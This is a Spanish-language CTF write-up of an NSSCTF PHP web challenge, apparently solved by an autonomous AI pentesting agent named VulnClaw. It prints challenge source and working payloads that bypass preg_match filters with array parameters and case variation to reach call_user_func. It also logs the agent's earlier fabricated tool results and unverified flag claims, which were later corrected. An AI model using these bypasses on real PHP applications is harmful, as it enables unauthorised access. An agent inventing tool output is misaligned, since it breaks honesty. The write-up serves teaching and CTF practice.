# 🦞 War Story #001 — NSSCTF Bypass de expresión regular de PHP + call_user_func

## Metainformación

| Campo | Valor |
|------|------|
| **Fecha** | 2026-04-19 |
| **Objetivo** | `http://node5.anna.nssctf.cn:23284/` |
| **Tipo de reto** | Web — Bypass de expresión regular de PHP + callback de array en call_user_func |
| **Palabras clave** | PHP, bypass de regex, deserialización, call_user_func, bypass de array |
| **Rondas de VulnClaw** | 12 |
| **Herramientas MCP** | fetch |
| **Flag correcta** | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` |

---

## Cadena de ataque (flujo real completo)

| Paso | Acción | Hallazgo |
|------|------|------|
| 1 | Solicitud GET a la página de inicio | Apache/2.4.54 + PHP/7.4.30, se descubrieron `js/1.js` y `css/1.css` |
| 2 | Revisión de `js/1.js` | Se encontró una cadena Base64 en un comentario JS: `NSSCTF{TnNTY1RmLnBocA==}` |
| 3 | Decodificación Base64 | Se obtuvo `NsScTf.php` — un archivo PHP oculto |
| 4 | Solicitud GET a `NsScTf.php` | Se obtuvo el código fuente: clase de deserialización NSSCTF + ruta de `call_user_func` |
| 5 | Análisis de la expresión regular | `preg_match("/n|c/m", ...)` sin el modificador `i` → se puede bypassear con mayúsculas/minúsculas |
| 6 | Intento con `p=Nss::ctf` (bypass de mayúsculas/minúsculas) | Devolvió "no" — la clase Nss no existe, hay que encontrar el nombre correcto de la clase |
| 7 | Acceso a `hint2.php` | Pista: **"¿No será que la clase es nss2?"** |
| 8 | Intento con `p=Nss2::Ctf` | Devolvió "no" — la `s` en minúscula de `Nss2` no afecta, pero puede haber un problema con cómo se procesa `::` |
| 9 | Análisis de la semántica de `call_user_func` | `call_user_func` admite callbacks de array `['NombreClase', 'nombreMetodo']` |
| 10 | Construcción del payload de bypass de array | `p[]=nss2&p[]=ctf` → bypassea `preg_match` con un array, el callback llama a `nss2::ctf()` |
| 11 | Envío de `GET /NsScTf.php?p[]=nss2&p[]=ctf` | ✅ ¡Éxito! La respuesta contiene `<?php $flag="NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}";?>` |
| 12 | Confirmación de la flag | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` ✅ |

---

## Análisis del código fuente

### Archivo de entrada de la página de inicio

```php
<?php
header('Content-type: text/html; charset=utf-8');
error_reporting(0);
highlight_file(__FILE__);

class NSSCTF{
    public $cmd;
    public $name;

    function __destruct(){
        if(strlen($this->cmd) > 1 && strlen($this->cmd) < 100){
            if(stripos($this->cmd, 'n') !== false || stripos($this->cmd, 'c') !== false){
                if (preg_match_all('/n|c/', $this->cmd, $matches)){
                    system($this->cmd);
                }
            }
        }
    }
}

@unserialize($_GET['nss']);
?>
```

**Análisis**: la ruta de deserialización de la clase `NSSCTF` existe, pero la combinación de `stripos` (que no distingue mayúsculas/minúsculas) y `preg_match_all` (que sí distingue) hace que la RCE sea extremadamente difícil de disparar. **El verdadero punto de la vulnerabilidad no está aquí**.

### Código de vulnerabilidad real (al final de NsScTf.php)

```php
//hint: ¿cuál es otro protocolo de solicitud similar a get?
include("flag.php");
class nss {
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m", $_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

### hint2.php

```
¿No será que la clase es nss2?
```

### La clase real que lee la flag

```php
class nss2 {
    static function ctf(){
        include("flag.php");
        echo $flag;
    }
}
```

---

## Payload correcto y su principio

### Payload 1: bypass de array (solución final exitosa)

```
GET /NsScTf.php?p[]=nss2&p[]=ctf
```

**Principio**:
1. `?p[]=nss2&p[]=ctf` hace que `$_GET['p']` se convierta en el array `['nss2', 'ctf']`
2. `preg_match("/n|c/m", array, ...)` necesita una cadena como segundo parámetro; al pasarle un array devuelve `false` → **bypassea la expresión regular**
3. `call_user_func(['nss2', 'ctf'])` — el callback de array equivale a `nss2::ctf()` → incluye `flag.php` y lo imprime

### Payload 2: bypass de mayúsculas/minúsculas (viable en teoría)

```
GET /NsScTf.php?p=Nss2::Ctf
```

**Principio**:
- La expresión regular `/n|c/m` no tiene el modificador `i`, solo coincide con `n` y `c` en minúscula
- En `Nss2::Ctf`, la `N` y la `C` están en mayúscula, por lo que la expresión regular no las detecta → bypass
- Los nombres de clase y método en PHP no distinguen mayúsculas/minúsculas, así que `Nss2::Ctf` equivale a `nss2::ctf()`

> ⚠️ En la práctica, el bypass de mayúsculas/minúsculas fue bloqueado (la Ronda 7 devolvió "no"), posiblemente porque la forma en que `call_user_func` de PHP analiza la cadena `Nss2::Ctf` es distinta, o existe algún otro filtro. **El bypass de array es más confiable**.

---

## Registro de corrección de problemas de alucinación de VulnClaw

En la primera ejecución (versión inicial de #001), VulnClaw expuso problemas graves de alucinación:

| Tipo de alucinación | Manifestación | Causa raíz | Corrección |
|----------|------|------|------|
| Invención de resultados de herramientas | fetch devolvió una flag imposible | El LLM inventó el resultado tras razonar en el bloque think | Se agregaron reglas estrictas contra la alucinación en prompts.py |
| Comprensión errónea de parámetros | Se creía que `call_user_func('readfile')` sin argumentos podía leer archivos | No se entendía la semántica de call_user_func | Se agregaron reglas de parámetros al contrato central |
| Finalización sin verificación | Al obtener la flag se pasaba directo a [DONE] | No había mecanismo de verificación | Se agregó seguimiento de verificación de flag en core.py |
| Conocimiento insuficiente de expresiones regulares | No se conocían los bypasses de mayúsculas/minúsculas ni de array | Faltaba conocimiento sistemático de bypass de regex en PHP | Se ampliaron prompts.py + documentos de referencia de Skill |

**Mejoras de código**:
- `prompts.py`: se agregaron reglas de "alucinación estrictamente prohibida" + paso obligatorio de verificación de flag + conocimiento sistemático de bypass de expresiones regulares en PHP
- `core.py`: se agregó `_detect_flag_claim()` para el seguimiento de verificación de flag + verificación obligatoria en el ciclo autónomo
- `web-playbook-24-php-regex-bypass.md`: nuevo documento de referencia especializado en bypass de expresiones regulares de PHP

---

## Resumen de la experiencia

### Metodología central

1. **Primero analiza los modificadores de la expresión regular**: la presencia o ausencia de `i` (ignorar mayúsculas/minúsculas), `m` (multilínea), `s` (el punto coincide con saltos de línea) determina directamente el método de bypass
2. **El bypass de mayúsculas/minúsculas es el más común**: cuando la expresión regular no tiene el modificador `i`, los nombres de función/clase de PHP no distinguen mayúsculas de minúsculas
3. **El bypass de array es universal**: `preg_match` con un array como argumento devuelve `false`, aplicable a casi todos los filtros basados en `preg_match`
4. **call_user_func admite callbacks de array**: `['NombreClase', 'nombreMetodo']` equivale a `NombreClase::nombreMetodo()`
5. **No te obsesiones con un solo camino**: la ruta de deserialización con `stripos` era muy difícil de bypassear → se cambió a la ruta de `call_user_func` → bypass de array

### Verificación de capacidades de VulnClaw

| Capacidad | Desempeño | Puntuación |
|------|------|------|
| Reconocimiento del objetivo | Descubrimiento automático de pistas Base64 en el JS | ⭐⭐⭐⭐ |
| Análisis del código fuente | Análisis correcto de la lógica de la expresión regular y de call_user_func | ⭐⭐⭐⭐ |
| Construcción del bypass | De bypass de mayúsculas/minúsculas → bypass de array, aproximación gradual | ⭐⭐⭐ |
| Verificación de la flag | Verificación obligatoria tras la corrección, se confirmó que la flag era real | ⭐⭐⭐⭐ |
| Control de alucinaciones | Sin alucinaciones tras la corrección, las herramientas devolvieron datos reales | ⭐⭐⭐⭐ |

---

*Primer combate de VulnClaw · 2026-04-19 · 12 rondas de pentesting autónomo · bypass de array exitoso, flag capturada · problema de alucinación corregido 🦞*
